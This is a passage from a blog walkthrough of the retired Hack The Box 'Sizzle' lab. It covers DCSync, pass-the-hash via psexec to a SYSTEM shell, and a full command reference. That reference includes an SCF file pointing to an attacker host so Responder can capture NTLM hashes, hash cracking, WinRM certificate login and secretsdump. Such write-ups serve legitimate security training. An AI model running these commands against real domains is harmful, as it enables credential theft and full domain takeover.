+<p><strong>Fresh Administrator hash:</strong> <code>[redacted retired-lab hash or flag]</code></p>
+<p><strong>Note:</strong> The hash from <code>file.txt</code> was stale (<code>c718f548...</code>), but DCSync gives us the <strong>current</strong> hash. This is why we didn't skip directly to PTH with the file.txt hash — stale hashes fail.</p>
+<p><strong>The Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>DCSync is the ultimate Active Directory attack. With one command, you turn a single compromised user into full domain compromise. If a user has GetChangesAll, they are effectively a Domain Admin — even if they're not in the Domain Admins group.</strong></p>
+</blockquote>
+<hr />
+<h2 id="phase-9-pass-the-hash-becoming-system">Phase 9: Pass-the-Hash — Becoming SYSTEM</h2>
+<h3 id="the-hacker-mindset-i-don-t-need-your-password-i-have-your-hash">The Hacker Mindset: "I don't need your password. I have your hash."</h3>
+<p>In Windows authentication, the <strong>NTLM hash</strong> is what actually proves identity. When you type a password, Windows converts it to an NTLM hash and uses that hash for everything. This means:</p>
+<blockquote>
+<p><strong>If you have the NTLM hash, you don't need the password. You can "pass the hash" directly to authenticate.</strong></p>
+</blockquote>
+<h3 id="step-9-1-pth-with-psexec-py">Step 9.1: PTH with psexec.py</h3>
+<pre><code class="language-bash" data-language="bash">impacket-psexec -hashes [redacted retired-lab hash or flag]:[redacted retired-lab hash or flag] htb.local/Administrator@10.129.1.1
+</code></pre>
+<p><strong>What psexec does:</strong></p>
+<ol>
+<li>Authenticates to SMB using the Administrator hash</li>
+<li>Uploads a service executable to <code>ADMIN$</code> (which is <code>C:\Windows</code>)</li>
+<li>Creates and starts a Windows service</li>
+<li>The service runs as <code>SYSTEM</code></li>
+<li>We get a command shell</li>
+</ol>
+<p><strong>Success:</strong></p>
+<pre><code>Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+</code></pre>
+<h3 id="step-9-2-grabbing-the-flags">Step 9.2: Grabbing the Flags</h3>
+<pre><code class="language-cmd" data-language="cmd">type C:\Users\mrlky\Desktop\user.txt
+type C:\Users\Administrator\Desktop\root.txt
+</code></pre>
+<p><strong>Results:</strong></p>
+<pre><code>e6062d[redacted]8c052c0b1e
+d9d0a5[redacted]38d5d7c444e
+</code></pre>
+<p><strong>The Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>Pass-the-Hash is why password hash dumps are so devastating. Even if every user changes their password tomorrow, the attacker who has the old NTLM hash can still authenticate — until the account is explicitly disabled or the password is REDACTED twice (to clear the password history).</strong></p>
+</blockquote>
+<hr />
+<h2 id="key-takeaways-and-hacker-mindset">Key Takeaways &amp; Hacker Mindset</h2>
+<h3 id="1-chain-the-misconfigurations">1. Chain the Misconfigurations</h3>
+<p>Sizzle is not compromised by one vulnerability. It is compromised by a <strong>chain</strong>:</p>
+<ul>
+<li>Writable SMB share (misconfiguration)</li>
+<li>SCF file triggers authentication (design behavior)</li>
+<li>Weak password allows cracking (human factor)</li>
+<li>ADCS allows certificate issuance (design behavior)</li>
+<li>WinRM accepts certificate auth (design behavior)</li>
+<li>mrlky has DCSync rights (permission misconfiguration)</li>
+<li>Pass-the-Hash completes compromise (protocol design)</li>
+</ul>
+<blockquote>
+<p><strong>Each individual step is "working as intended." The attack emerges from the interaction of these intended behaviors.</strong></p>
+</blockquote>
+<h3 id="2-forced-authentication-is-silent-and-deadly">2. Forced Authentication Is Silent and Deadly</h3>
+<p>The SCF attack requires no exploit, no vulnerability scanner, no reverse shell. You drop a file and wait. It is:</p>
+<ul>
+<li><strong>Stealthy</strong> — No logs of exploitation, just normal SMB activity</li>
+<li><strong>Reliable</strong> — Windows ALWAYS tries to load icons</li>
+<li><strong>Effective</strong> — Works on almost every Windows domain with writable shares</li>
+</ul>
+<h3 id="3-certificates-are-credentials">3. Certificates Are Credentials</h3>
+<p>When you see ADCS, think: "Can I get a certificate?" Certificates are often overlooked by defenders but grant the same access as passwords — sometimes more.</p>
+<h3 id="4-look-for-what-s-already-there">4. Look for What's Already There</h3>
+<p>Before uploading SharpHound, BloodHound, or any toolkit, look at what the system already contains:</p>
+<ul>
+<li>Log files with credentials</li>
+<li>Backup files</li>
+<li>Scripts with hardcoded passwords</li>
+<li><code>file.txt</code> with dumped hashes</li>
+</ul>
+<blockquote>
+<p><strong>The fastest hack is the one you don't have to perform because someone already did it for you.</strong></p>
+</blockquote>
+<h3 id="5-dcsync-is-domain-death">5. DCSync Is Domain Death</h3>
+<p>If you can DCSync, the game is over. Every password in the domain is yours. The only recovery is a full forest recovery — rotating every password, resetting the KRBTGT password twice (to invalidate Golden Tickets), and auditing every account.</p>
+<h3 id="6-hashes-are-passwords">6. Hashes Are Passwords</h3>
+<p>Treat NTLM hashes with the same sensitivity as plaintext passwords. With Pass-the-Hash, they ARE passwords. A domain with LM hashes enabled, weak passwords, or excessive replication rights is a domain waiting to fall.</p>
+<hr />
+<h2 id="full-command-reference">Full Command Reference</h2>
+<pre><code class="language-bash" data-language="bash"># === PHASE 1: RECON ===
+nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv -oG allPorts 10.129.1.1
+nmap -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986 -sCV -Pn -n -vvv -oN targeted 10.129.1.1
+
+# === PHASE 2: SMB ===
+smbclient -N -L //10.129.1.1
+sudo mkdir -p /mnt/sizzle
+sudo mount -t cifs '//10.129.1.1/Department Shares' /mnt/sizzle -o username=guest,password=
+
+REDACTED === PHASE 3: SCF ATTACK ===
+cat &lt;&lt; 'EOF' &gt; sizzle.scf
+[Shell]
+Command=2
+IconFile=\\10.10.14.6\share\icon
+[Taskbar]
+Command=ToggleDesktop
+EOF
+sudo cp sizzle.scf /mnt/sizzle/Users/Public/
+sudo responder -I tun0
+
+# === PHASE 4: CRACKING ===
+# Save hash to amanda.hash, then:
+hashcat -m 5600 amanda.hash /usr/share/wordlists/rockyou.txt
+
+# === PHASE 5: ADCS CERTIFICATE ===
+openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
+# Submit CSR to http://10.129.1.1/certsrv, download certnew.cer
+
+# === PHASE 6: WINRM SHELL ===
+evil-winrm -S -c certnew.cer -k amanda.key -i 10.129.1.1 -u 'amanda' -p REDACTED
+
+# === PHASE 8: DCSYNC ===
+impacket-secretsdump -hashes [redacted retired-lab hash or flag]:[redacted retired-lab hash or flag] htb.local/mrlky@10.129.1.1
+
+# === PHASE 9: PASS-THE-HASH ===
+impacket-psexec -hashes [redacted retired-lab hash or flag]:[redacted retired-lab hash or flag] htb.local/Administrator@10.129.1.1
+</code></pre>
+<hr />
+<p><em>Happy hacking. Remember: every technique in this walkthrough is used by real attackers every day. Learn it, understand it, and defend against it.</em></p>
+9:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$e"}}]
+a:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-arkham-walkthrough","children":[["$","span",null,{"children":"Newer article"}],["$","strong",null,{"children":"HackTheBox “Arkham” Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",114," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-search-walkthrough","children":[["$","span",null,{"children":"Older article"}],["$","strong",null,{"children":"Hack The Box: Search Walkthrough"}]]}]}]]}]
+b:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Public profiles","children":[["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Hack The Box",{"href":"https://app.hackthebox.com/public/users/349278","target":"_blank","rel":"noreferrer","children":["Hack The Box"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credential wallet",{"href":"https://www.credential.net/profile/cyberkareem/wallet","target":"_blank","rel":"noreferrer","children":["Credential wallet"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credly",{"href":"https://www.credly.com/users/cyberkareem/badges","target":"_blank","rel":"noreferrer","children":["Credly"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Evidence-led research · authorized assessment"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
+f:T516,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-sizzle-walkthrough/#article","headline":"Hack The Box: Sizzle Walkthrough","description":"An archived walkthrough of the retired Hack The Box Sizzle machine, preserved from Abdullah Kareem's OSEP Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-sizzle-walkthrough/","datePublished":"2026-06-11T16:09:45.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":3437,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSEP-Prep/blob/540ce46f57834e2f55146507411aac9f3229ed42/HTB-Sizzle.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-sizzle-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-sizzle-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Sizzle Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-sizzle-walkthrough/"}]}]}c:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$f"}}]
+d:["$","$L10",null,{"children":["$","$11",null,{"name":"Next.MetadataOutlet","children":"$@12"}]}]
+12:null
